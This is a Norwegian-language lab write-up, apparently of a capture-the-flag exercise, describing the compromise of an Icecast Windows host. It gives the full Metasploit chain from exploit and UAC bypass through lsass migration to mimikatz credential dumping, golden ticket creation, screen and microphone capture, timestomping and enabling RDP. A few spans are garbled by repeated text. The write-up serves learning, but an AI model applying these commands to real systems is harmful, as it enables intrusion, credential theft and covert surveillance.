#Logg for 26/04/2020

#Hva slags type maskin er utsatt: ICE
#Utsatt maskin sin ip: 10.10.169.236

#Beskriv hva du har gjort under hackingen + kommandoer

Startet nmap SYN scan mot utsatt maskin:
nmap -sS -O -oX nmap-report --webxml 10.10.169.236	#SYN scan er veldig bra i aa finne ut hvilke porter som er aapne paa en utsatt maskin.
#Med andre ord hvilke kommunikasjonsmuligheter som er mulige. I tillegg og kanskje det beste med SYN scan er at det ikke opprettes fullstendige koblinger
#Saa denne typen scan blir sett paa som aa vaere "stealth scan" og vanskelig aa bli funnet om ikke det letes etter spesifikt

#Scannen saa ut til aa gaa feilfri, dette kan kanskje tyde at firewall ikke beksytter/ikke er tilstede.
#sier ivertfall at firewall er nede, og faktisk at vi skal kunne se at RDP tjenesten er oppe i output.

Etter litt sooking paa hva de ulike tjenestene er fant jeg ut at tjenesten/service ms-wbt-server er protokollen som brukes i RDP.
Dette kan vaere interessangt fordi vi kan proeve aa koble oss paa serveren med en exploit!

Det er nevneverdig at SYN scannen fra nmap er bra i aa si hvilke porter som er aapne osv, men paa port 8000 staar det bare http og ikke hvilken tjeneste som faktisk kjores.
Derfor kan det vaere smart aa gjoore en ny scan som spesifikt finner ut hvilken tjeneste som kjoeres paa porter, nemlig nmap -sV:
nmap -sV 10.10.169.236 		#kan vaere smart aa begynne aa sette flagget -v for verbose, da faar vi tilbakemelding under scannen om hva som blir gjort 
#Etter scan ser vi at tjenesten Icecast streaming media server er det som blir kjoert paa port 8000

foreslo aa bruke https://www.cvedetails.com, der kan du sooke opp tjenester og faa dokumenterte vulnerabilities knyttet til dem. Ytterligere
har exploitene CVE (Common Vulnerabilities and Exposures) nummer for aa gjenskjenne dem, i tillegg til rangering paa alorlighetsgrad. 

denne tjenesten var en 2004 modell, men jeg fant ingen steder under nmap sookene hvor jeg fikk spesifikt service version dessverre. Det maa
jeg finne ut hvordan jeg kan gjoore til fremtiden. Skal egentlig vaere nmap -sV som gir deg all info tjenestene som kjoeres paa porter og deres versjon. 
Med andre ord var det kanskje bare ikke mulig aa finne ut noyaktig hvilken versjon Icecast var.

Uansett jeg fant 2004 icecast vulnerabilitien paa nettsiden og den hadde hoy score. Denne vulnerabilitien var av typen "Execute CodeOverflow":
Sitat fra www.cvedetails.com: "Buffer overflow in Icecast 2.0.1 and earlier allows remote attackers to execute arbitrary code via HTTP request with a large number of headers" 

Gikk deretter over til Metasploit og sookte paa icecast, da fikk jeg opp kunn ett resultat:
search icecast	#Hensikten min her var aa finne diverse moduler for aa teste opp mot utsatt maskin.
		#var kunn ett resultat, faktisk 2004 exploiten saa jeg hviste det var den rette

Brukte modulen til aa faa meterpreter ookt med utsatt maskin:
use exploit/windows/http/icecast_header	#Bruker modulen
show options				#Ser hva som er mulig med modulen, spesifikt hvilke variabler som er nodvendig 
setg rhost 10.10.169.236		#Setter globale variabel paa utsatt maskin
run					#Kjoorer modulen
					#Naa har jeg meterpreter ookt med utsatt pc

Noen greie kommandoer for aa faa godt inntrykk av maskinen naar du har faatt meterpreter shell:
getuid		#Hvilken bruker kjoorer programmet jeg har exploita
sysinfo		#Faar informasjon om den utsatte/remote maskinen som OS
getpid		#Faa process ID som du er i, for etterpa kan du se paa hvilke andre prosesser som kjoorer ved ps
ps		#prosess/prosess list/processes	viser alle prosesser med nyttig format som ID, navn osv. 
getsystem	#Prover aa eskalere rettighetene dine tilsvarende til lokale systemet

Naa er vi i post stadiet og kan benytte oss av local exploit suggester, lester
#For aa kunne bruke lester maa vi ha en session paa utsatt maskin. Det er viktig aa notere seg hva slags type ookt en har siden det kan paavirke hvilke vulnerabilities som
#blir detected. Hvis vi bruker windows er vi anbefalt aa bruke meterpreter, for alle andre OS anbefaler en shell ookt. Inntil videre antar jeg dette gjelder for det utsatte
#Altsaa meterpreter for windows maskiner vi har penetrert

Naar vi har aapnet en session med utsatt pc er det et par ekstra tiltak som kan hjelpe med forstaelsen, dette gjores i metasploit og ikke meterpreter tror jeg:
set verbose true		#Be maskinen si hva den gjor
set exitonsession false		#ikke bryt kobling??

Naa kan vi bruke lester til aa gjore grovarbeidet for oss:
run post/multi/recon/local_exploit_suggester SHOWDESCRIPTION=true	#SHOWDESCRITPION er viktig for aa vise description paa de ulike exploitene som kommer opp
#vi husker ikke hva ms17_010 gjoor for eksemepl. Greit aa vite at det er tre ulike tilstander som blir beskrevet av lester
			#Vulnerable: The check was able to use a bug or obtain hard evidence of its existence
			#Appears: When the target has the vulnerable resource available
			#Detected: When the target has a vulnerable service running but the check is unable to complete

#Men det er viktig aa huske at det kan ogsaa vaere tilfelle at exploiten ikke ble sjekket i det hele tatt. Dette hender nar exploiter som trenger en option/variabel som ikke er satt

Lester gir en boottevis med ulike exploiter som kan fungere, og sammen med SHOWDESCRIPTION kan vi lese ganske detaljert hva hver exploit gjoor.
I dette eksempelet var foorste exploit veldig passende:

exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.                                                                                  
  This module will bypass Windows UAC by hijacking a special key in    
  the Registry under the current user hive, and inserting a custom   
  command that will get invoked when the Windows Event Viewer is      
  launched. It will spawn a second shell that has the UAC flag turned
  off. This module modifies a registry key, but cleans up the key once                    
  the payload has been invoked. The module does not require the                                                                                                                     
  architecture of the payload to match the OS. If specifying      
  EXE::Custom your DLL should call ExitProcess() after starting your   
  payload in a separate process.   

Vi setter vaar naavaerende ookt som bruker icecast header exploiten i bakgrunn og bruken den nye exploiten gitt av lester:
background					#Setter naavaerende prosess i bakgrunn
use exploit/windows/local/bypassuac_eventvwr	#Bruker ny modul av exploit typen
show options					#Vise hvilke options/variabler som er nodvendig for aa kjore, hva som er mulig aa gjoore i denne modulen
#Show options viser noe spessielt her, denne modulen krever at vi har en ookt som saa denne modulen kan brukes paa. vi maa altsa sette variabelen "session"
set session sessionNummer			#set session 2 i mitt tilfelle
#pressiserte at naa som vi hadde satt variabelen/option til aa vaere lik noe saa skulle vi se nye options fra "show options". Dette var ikke tilfelle for meg
#Iallfall sier  at vi vaar lytte prosess har feil IP saa vi maa endre paa variabelen "lhost". Jeg saa ingen indikasjon paa at denne variabelen trengte aa endres
#likevel satte jeg "setg lhost 34.245.220.134"

Naa som vi har satt de noodvendige variablene kan vi kjoore modulen:
run		#kjoor exploit/modulen

Exploiten fungerte konge og aapnet en ny meterpreter ookt, denne hadde langt flere rettigheter. Rettigheter kan bli sjekket med:
getprivs		#Ekstremt nyttig, faar en listet visning av rettighetene dine.

Den nye meterpreter session med eskalerte rettigheter lar oss migrere, dette kan vaere lurt aa gjoore til en stabil prosess:
ps				#process list/processes, da ser vi alle prosessene og deres PID. kan skrive ps lsass for aa filtrere paa denne prosessen spesifikt
migrate skrivPIDpaaProsessenDuVilMigrereTil
#I dette tilfellet vil at vi skal migrere til lsass (Local Security Authority Subsystem) som validerer innlogging av en bruker paa en pc eller en server.

ps lsass
		#Viktig aa notere seg to ting. For aa kunne "interacte" med lsass maa vi "bo i/living in" en process som har samme arkitektur som lsass tjenesten.
		#I dette tilfellet er det x64, I tillegg maa prosessen du migrerer fra ha samme rettigheter som lsass. 
	
		#Andre som er viktig er begrepet "bo i/living in" en prosess. Ofte naar vi tar over et kjoorende program saa laster vi ett nytt library
		#(ett nytt i tillegg er kanskje mer riktig aa si). Dette library kalles (dll), saa vi laster et nytt dll i det kjorende programmet. Dette library har vaar
		#malicious kode i seg. Fra dette kan vi "spawn a new thread that host our shell". 
	
late file MACE attributeslate file mace attributeslate file mace attributeslate file mace attributesnaa som vi har fatt administrator rettigheter kan vi gaa over til "looting" stadiet. ber oss om aa bruke "minikatz" som er
en veldig kjent "password dumping tool". 
da loader vi minikatz med kommandoen:
load kiwi		#kiwi er den oppdaterte versjonen av minikatz

late file MACE attributeskiwi er naa loaded og vi ser det i praksis ved aa aapne hjelp menyen og ser paa kiwi sine entries:
help

kiwi lar oss stjele passord ut av minne selv om brukeren "dark" ikke er logget inn siden det er en "scheduled task" som kjoorer icecast prosessen som brukeren "dark":
creds_all		#litt usikker paa om den henter alle passord i praksis, eller om det maa vaere prosesser tilknyttet en bruker for aa kunne faa han sitt passord osv??
#nb. denne maskinen har verken windows defender eller firewall paa og er ikke et realistisk scenario. 



----------------------------------------post escalation----------------------------------------------

naa har vi administrator rettigheter og kan gaa amok paa utsatt maskin, for eksempel see han sin desktop i real time:
screenshare		#da faar du en path til en html fil. denne blaster du i nettleser saa har du getto stream :d

andre ekle kommandoer:
record_mic	#har ikke testet den, men tipper det er noenlunde det samme som screenshare med at du faar path til en fil som har audio-en
timestomp	#endre paa timestamt til en fil. "Manipulate file MACE attributes" 
"never do this command on a pentest unless told, not beneficial to defendant" 

Minikatz (kiwi er den oppdaterte) lar oss lage en "golden ticket" som lar oss autentisere hvor som helst:
golden_ticket_create 		#Er en boottevis med options som maa bli gitt for aa faa golden ticket, for eksempel FQDN (Fully qualified domain name), navn paa bruker osv..
#Denne exploiten virker konge. Golden ticket attack er en funksjon i Minikatz som utnytter en komponent i Kerberos (The authentication system in Windows domains), nemlig den "ticket granting ticket". I korte trekk tillater golden ticket attack oss aa forbli vedvarende og autentisere oss som alle brukere i domenet. 

En ting som er verdt aa notere seg er at vi har passordet til brukeren "Dark" og kunne derfor ha brukt RDP (Remote Desktop/MSRDP)
#Likevel er det viktig aa huske at siden denne maskinen er en "workstation" ville vi mest sannsynlig ha sparket brukeren som var logget inn paa systemet. 
Dersom RDP ikke er tillatt paa systemet kan vi tillate det gjennom:
run post/windows/manage/enable_rdp

Vi kan naa offisielt kalle oss for script kiddies! 
#Neste steget blir aa sjekke ut hvordan du kan gjore slike manipulasjoner manuelt.  har gitt denne linken for aa laere om manuel exploitation:
"Explore manual exploitation via exploit code found on exploit-db. exploit link: https://www.exploit-db.com/exploits/568"
#spesifikt denne linken henviser faktisk til hvordan du kan manuelt hijacke Icecast for remote code execution
#Maa tross alt huske at vi vil ikke alltid ha muligheten til aa kunne bruke metasploit. 

Neste modul etter denne, ICE, er BLASTER!



